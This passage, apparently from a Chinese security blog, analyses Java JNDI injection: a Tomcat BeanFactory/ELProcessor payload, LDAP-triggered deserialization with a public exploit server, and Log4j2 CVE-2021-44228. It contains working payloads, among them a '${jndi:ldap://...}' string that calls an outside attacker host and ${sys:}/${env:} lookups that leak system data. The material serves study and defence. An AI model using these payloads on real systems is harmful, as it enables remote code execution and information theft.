<div class="highlight"><pre><span></span><span class="n">ResourceRef</span><span class="o">[</span><span class="n">className</span><span class="o">=</span><span class="n">javax</span><span class="o">.</span><span class="na">el</span><span class="o">.</span><span class="na">ELProcessor</span><span class="o">,</span><span class="n">factoryClassLocation</span><span class="o">=</span><span class="kc">null</span><span class="o">,</span><span class="n">factoryClassName</span><span class="o">=</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">factory</span><span class="o">.</span><span class="na">BeanFactory</span><span class="o">,{</span><span class="n">type</span><span class="o">=</span><span class="n">scope</span><span class="o">,</span><span class="n">content</span><span class="o">=},{</span><span class="n">type</span><span class="o">=</span><span class="n">auth</span><span class="o">,</span><span class="n">content</span><span class="o">=},{</span><span class="n">type</span><span class="o">=</span><span class="n">singleton</span><span class="o">,</span><span class="n">content</span><span class="o">=</span><span class="kc">true</span><span class="o">},{</span><span class="n">type</span><span class="o">=</span><span class="n">forceString</span><span class="o">,</span><span class="n">content</span><span class="o">=</span><span class="n">faster</span><span class="o">=</span><span class="n">eval</span><span class="o">},{</span><span class="n">type</span><span class="o">=</span><span class="n">faster</span><span class="o">,</span><span class="n">content</span><span class="o">=</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">)}]</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105513-3b17369e-8c33-1.png"/></p>
<p>而后其通过ref.getClassName()来获取我们ResourceRef类的内部的resourceClass名，即我们在Server中传入的javax.el.ELProcessor。<br/>
而后通过类加载其来得到这个类。命名为beanClass</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105518-3e453550-8c33-1.png"/></p>
<p>之后将beanClass实例化为bean。<br/>
再获取ref内Type为forceString的内容赋值给ra，而forceString的内容为faster=eval。</p>
<p>而后又创建了一个HashMap，变量名为forced。</p>
<p>然后进入一个循环，将ra的getContent取出传入Value，而后将value的内容<code>faster=eval</code>放入数组<code>arr$</code>内。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105528-443e032e-8c33-1.png"/></p>
<p>后面又将数组内的值取出赋值给param，然后截取=前的所有字符赋值为param，之后的赋值为propName<br/>
然后将param作为键放入到之前定义的map forced中，其值为一个反射调用，其调用的，<code>beanClass.getMethod(propName, paramTypes)</code>,其放射获取的内容就是ELProcessor下的eval方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105541-4bbd4830-8c33-1.png"/></p>
<p>之后进入一个do while循环。这个循环会获取ref中的Type键的值。直到获取到非规定内容的Type的键值对。即其将ra定义为我们的传入的那个StringRefAddr</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105546-4f00ac12-8c33-1.png"/></p>
<p>最终会将propName赋值为我们定义的Type:<code>faster</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105550-5150d91a-8c33-1.png"/></p>
<p>最后其再从Map中拿出键为faster的值，也就是我们的eval方法。<br/>
而其value获取ra的Content，其值就是我们命令执行的代码。<code>Runtime.getRuntime().exec("calc")</code><br/>
最后放射调用的代码其实就是 <code>eval.invoke(bean,'Runtime.getRuntime().exec("calc")')</code>bean也就是ELProcessor的实例。</p>
<p>这样就可以命令执行了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105600-56f7c266-8c33-1.png"/></p>
<p>在tomcat的9.62之后的版本里，其将之前的method.invoke(bean,valueArray)直接进行了删除，这就到导致了我们无法在使用之前的方法进行命令执行</p>
<h2 data-content="1" id="3b2907413882fe870b910e162795069a">原生反序列化</h2>
<p>JNDI注入通过Ldap的方法是可以触发反序列的。</p>
<p>前面我写的Ldap高版本的注入的exp是自己搭建的Ldap服务器,但这样太过于麻烦,于是我尝试再网上找项目,于是我便找到了如下项目。<br/>
<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master" target="_blank">JNDI-Exploit-Bypass-Demo</a><br/>
使用这个项目需要我们自己进行打包<br/>
食用方法</p>
<pre><code>mvn package
java -cp HackerRMIRefServer-all.jar HackerRMIRefServer 0.0.0.0 8088 1099
java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  0.0.0.0 8088 1389</code></pre>
<p>这个项目内有个Ldap反序列化触发的java文件我们打打包前要对其进行修改</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105610-5d2f0b8a-8c33-1.png"/></p>
<p>将其反序列化的payload进行更改，我这里改成了CC1的链</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105614-5f8512c6-8c33-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105618-621d54e4-8c33-1.png"/></p>
<p>可以看到服务器也显示了请求记录<br/>
我们调试一下客户端。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105623-650da83e-8c33-1.png"/></p>
<p>前半部分都相同，而后面其检测了传入值attrs的<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>属性。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105629-68905074-8c33-1.png"/></p>
<p>而这个<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>得到的就是字符串javaSerializedData</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105636-6c4e00c6-8c33-1.png"/></p>
<p>而后会进入deserialzeObject方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105641-6f7bd3ea-8c33-1.png"/></p>
<p>这就是标准的反序列化了。<br/>
这样就触发反序列化漏洞。</p>
<h1 data-content="1" id="dd6b39daea83d8bf140615496bd89689">log4j2</h1>
<h2 data-content="1" id="4fa1e77f4dd04c93c53b548e3fd7305f">JNDI的成因</h2>
<p>在log4j2的2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）版本内存在着JNDI注入的CVE-2021-44228</p>
<p>改漏洞的利用方式很简单。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">log4j</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Log4j</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span>  <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="s">"${jndi:ldap://111.xxx.xxx.159:389/EvilObj}"</span><span class="o">;</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"hello {}"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>起一个JNDI服务器然后运行上面的脚本就会发现成功命令执行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105648-73b14a3a-8c33-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105651-75aa6a38-8c33-1.png"/></p>
<p>log4j2的漏洞主要出现在 org.apache.logging.log4j.core.lookup.StrSubstitutor类上。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105657-7913a978-8c33-1.png"/></p>
<p>这个类会先堆<code>${</code>进行匹配</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105704-7d6c8256-8c33-1.png"/></p>
<p>然后再匹配尾部<code>}</code><br/>
以此来提取内部的值</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105713-82a92b52-8c33-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105716-84944b0e-8c33-1.png"/><br/>
然后会进入resolveVariable来触发Interpolator的lookup</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105722-88342d10-8c33-1.png"/></p>
<p>lookup方法会匹配: 即提取出前面的JNDI。<br/>
通过strLookupMap来提取出:前关键词的类。赋值给lookup，然后通过lookup.lookup来调用起地下的lookup<br/>
我们寻找这个strLookupMap可以发现如下。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105727-8b184c50-8c33-1.png"/></p>
<p>JNDI关键词指向的类就是org.apache.logging.log4j.core.lookup.JndiLookup<br/>
所以lookup.lookup会指向JndiLookup.lookup</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105733-8ed13d8e-8c33-1.png"/></p>
<p>JndiLookup.lookup下会通过jndiManager.lookup来进行JNDI的加载。<br/>
所以这个log4j可以通过${jndi:ldap://xxxx}<br/>
就可以进行jndi注入</p>
<h2 data-content="1" id="4ea49ebbb1c8c39dd2a3e749ebd6d17d">拓展</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105740-928df85e-8c33-1.png"/></p>
<p>在这里我们可以看到map还有指向其他的类。如sys<br/>
我们打开其指向的类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105745-95bc355e-8c33-1.png"/></p>
<p>我们可以看看到其直接返回了System.getProperty这样我们就可以进行信息探测。如输入的key为java.class.path就可以得到其加载的所有依赖的版本。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">log4j</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Log4j</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span>  <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>

        <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="s">"${sys:java.class.path}"</span><span class="o">;</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"hello {}"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="o">----------------------------------</span>
<span class="mi">10</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mf">41.693</span> <span class="o">[</span><span class="n">main</span><span class="o">]</span> <span class="n">ERROR</span> <span class="n">log4j</span><span class="o">.</span><span class="na">Log4j</span> <span class="o">-</span> <span class="n">hello</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">charsets</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">access</span><span class="o">-</span><span class="n">bridge</span><span class="o">-</span><span class="mf">64.</span><span class="n">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">cldrdata</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">dnsns</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">jaccess</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">localedata</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">nashorn</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">sunec</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">sunjce_provider</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">sunmscapi</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">sunpkcs11</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">ext</span><span class="err">\</span><span class="n">zipfs</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">jce</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">jfr</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">jsse</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">management</span><span class="o">-</span><span class="n">agent</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">resources</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">BellSoft</span><span class="err">\</span><span class="n">LibericaJDK</span><span class="o">-</span><span class="mi">8</span><span class="err">\</span><span class="n">jre</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">rt</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="mi">24882</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">java</span><span class="o">-</span><span class="n">sec</span><span class="err">\</span><span class="n">cc</span><span class="err">\</span><span class="n">target</span><span class="err">\</span><span class="n">classes</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="mi">24882</span><span class="err">\</span><span class="o">.</span><span class="na">m2</span><span class="err">\</span><span class="n">repository</span><span class="err">\</span><span class="n">org</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logging</span><span class="err">\</span><span class="n">log4j</span><span class="err">\</span><span class="n">log4j</span><span class="o">-</span><span class="n">core</span><span class="err">\</span><span class="mf">2.14.1</span><span class="err">\</span><span class="n">log4j</span><span class="o">-</span><span class="n">core</span><span class="o">-</span><span class="mf">2.14.1</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="mi">24882</span><span class="err">\</span><span class="o">.</span><span class="na">m2</span><span class="err">\</span><span class="n">repository</span><span class="err">\</span><span class="n">org</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logging</span><span class="err">\</span><span class="n">log4j</span><span class="err">\</span><span class="n">log4j</span><span class="o">-</span><span class="n">api</span><span class="err">\</span><span class="mf">2.14.1</span><span class="err">\</span><span class="n">log4j</span><span class="o">-</span><span class="n">api</span><span class="o">-</span><span class="mf">2.14.1</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="mi">24882</span><span class="err">\</span><span class="o">.</span><span class="na">m2</span><span class="err">\</span><span class="n">repository</span><span class="err">\</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="err">\</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="err">\</span><span class="mf">3.2.1</span><span class="err">\</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">-</span><span class="mf">3.2.1</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="mi">24882</span><span class="err">\</span><span class="o">.</span><span class="na">m2</span><span class="err">\</span><span class="n">repository</span><span class="err">\</span><span class="n">org</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">commons</span><span class="err">\</span><span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="err">\</span><span class="mf">4.0</span><span class="err">\</span><span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="o">-</span><span class="mf">4.0</span><span class="o">.</span><span class="na">jar</span><span class="o">;</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">JetBrains</span><span class="err">\</span><span class="n">IntelliJ</span> <span class="n">IDEA</span> <span class="mf">2024.1.1</span><span class="err">\</span><span class="n">lib</span><span class="err">\</span><span class="n">idea_rt</span><span class="o">.</span><span class="na">jar</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105750-98d165e8-8c33-1.png"/></p>
<p>env也可以进行环境变量的读取登</p>
<p>而这个log4j的漏洞在2.15之后就已经修复了，2.15版本将lookup给禁了，经过在本地尝试像sys，env这种获取敏感信息的方式也无法使用了</p>
</div>
</div>